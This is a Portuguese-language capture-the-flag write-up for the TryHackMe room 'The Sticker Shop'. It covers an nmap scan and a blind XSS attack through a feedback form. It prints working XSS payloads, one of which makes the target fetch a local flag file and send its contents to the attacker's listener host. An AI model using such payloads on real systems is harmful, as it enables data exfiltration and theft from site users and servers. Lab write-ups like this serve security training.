# THM - The Sticker Shop

![banner.png](THM%20-%20The%20Sticker%20Shop/banner.png)

Primeiro, iniciei fazendo um simples portscan na máquina usando o Nmap. O resultado mostrou apenas as portas 22 (SSH) e 8080 (HTTP) abertas.

```jsx
λ ~/ nmap -sV -sC -T4 10.10.213.133
```

![nmap1.png](THM%20-%20The%20Sticker%20Shop/nmap1.png)

Após o portscan, decidi verificar o que havia na aplicação web.

![website.png](THM%20-%20The%20Sticker%20Shop/website.png)

![feedback.png](THM%20-%20The%20Sticker%20Shop/feedback.png)

Indo no diretório feedback presente na main, nos deparamos com um campo de input para feedback. Antes de testar qualquer coisa, verifiquei o código fonte dessa página em busca de mais informações.

![source.png](THM%20-%20The%20Sticker%20Shop/source.png)

Após ler esse comentário, fiquei focado na possibilidade de exploração de XSS com hijack de cookies.então fui ler a dica na página da room do TryHackMe, com o enunciado. e cheguei a conclusão que não era esse o caso mas que realmente seria a exploração de um xss.

![hint.png](THM%20-%20The%20Sticker%20Shop/hint.png)

Então, ao testar como a aplicação reagia a alguns payloads XSS, consegui fazer com que ela realizasse uma requisição para mim utilizando o seguinte payload:

```jsx
<img src=x onerror="fetch('http://10.101.0.0:9090')"/>
```

![burpsuite.png](THM%20-%20The%20Sticker%20Shop/burpsuite.png)

 

![nc.png](THM%20-%20The%20Sticker%20Shop/nc.png)

Após descobrir isso, decidi fazer com que ela realizasse uma requisição para o diretório /flag.txt e, em seguida, enviasse o conteúdo para mim.

```jsx
<img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r => r.text()).then(r => fetch('http://10.101.0.0:9090/?c=' + r)).catch(e => fetch('http://10.101.0.0:9090/?c=' + e))"/>
```

![flag.png](THM%20-%20The%20Sticker%20Shop/flag.png)

![end.png](THM%20-%20The%20Sticker%20Shop/end.png)